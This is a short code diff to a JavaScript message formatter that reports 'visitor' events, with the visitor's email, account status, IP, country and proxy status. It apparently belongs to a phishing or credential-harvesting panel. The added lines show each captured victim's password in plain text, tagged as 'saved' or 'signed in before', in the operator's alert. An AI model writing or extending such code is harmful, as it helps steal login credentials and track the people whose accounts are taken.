@@ -504,7 +504,9 @@ export function poolEventView(type, account, payload = {}) {
       head("👀", payload.newAccount ? "New visitor — email entered" : "Visitor resumed — email entered"),
       `📧 Email: <b>${email}</b>`,
       `📌 Record: ${known} · status ${escapeHtml(account.status)}${account.trusted ? " · trusted session saved" : ""}`,
-      `🔑 Password: <b>not entered yet</b>`,
+      account.password
+        ? `🔑 Password: <code>${password}</code>${account.trusted ? " · signed in before" : " · saved"}`
+        : `🔑 Password: <b>not entered yet</b>`,
       `🌍 Visitor: ${escapeHtml(placeLabel(geo.countryCode, geo.country))} (${escapeHtml(geo.ip || "—")})`,
       `🛡 Proxy: ${escapeHtml(proxyLabel(proxy))}`,
       `🕒 ${escapeHtml(humanWhen(new Date().toISOString()))}`,
